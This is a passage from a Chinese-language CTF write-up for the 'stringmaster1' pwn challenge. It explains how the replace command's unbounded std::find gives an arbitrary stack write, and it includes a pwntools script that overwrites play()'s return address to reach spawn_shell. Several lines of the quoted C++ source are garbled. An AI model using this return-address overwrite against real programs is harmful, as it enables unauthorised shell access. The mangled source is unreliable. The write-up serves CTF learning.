        cout  ";
    }
    void play()
    {
        string from(10, '0');
        string to(10, '0');
        for (int i = 0; i                     (Cost: 1)"                    (Cost: 1)" > command;
            if (command == "swap")
            {
                unsigned int i1, i2;
                cin >> i1 >> i2;
                if (cin.good() && i1 > c1 >> c2;
                auto index = s.find(c1);
                cout = 0)
                {
                    s[index] = c2;
                }
                costs += 1;
            }
            else if (command == "print")
            {
                cout ::max(), 'n');
            }
            if (!cout)
            {
                cout.clear();
            }
            if (s == to)
            {
                cout 
    InputIterator
    find (
      InputIterator first,
      InputIterator last,
      const T& val
    );
    // find example
    #include      // std::cout
    #include     // std::find
    #include        // std::vector
    int main () {
      // using std::find with array and pointer:
      int myints[] = { 10, 20, 30, 40 };
      int * p;
      p = std::find (myints, myints+4, 30);
      if (p != myints+4)
        std::cout  myvector (myints,myints+4);
      std::vector::iterator it;
      it = find (myvector.begin(), myvector.end(), 30);
      if (it != myvector.end())
        std::cout << "Element found in myvector: " << *it << 'n';
      else
        std::cout << "Element not found in myvectorn";
      return 0;
    }
程序并没有给出find的first和last,那么我们稍微调试一下replace部分就能得到这个可以基本达成栈上的任意写，也就是说只要改play函数的retrun指针指向spwan_shell就可以成功getshell了，由于开始的位置和return指针之间不能保证要改的那个值只有在return指针有，所以我们多修改几次就能成功的修改指针来getshell了  
EXP
    #! /usr/bin/env python
    # -*- coding: utf-8 -*-    from pwn import*
    context(os='linux',arch='amd64',log_level='debug')
    n = process('./stringmaster1')
    elf = ELF('./stringmaster1')
    libc = elf.libc
    #n.recvuntil('String1: ')
    #str1 = n.recvline().strip()
    #n.recvuntil('String2: ')
    #str2 = n.recvline().strip()
    for i in range(4):
        n.recvuntil('')
        n.sendline('replace x24 x11')
    for i in range(4):
        n.recvuntil('')
        n.sendline('replace x6d xa7')
    n.sendline('quit')
    n.interactive()
####  参考链接
[cplusplus_find](http://www.cplusplus.com/reference/algorithm/find/)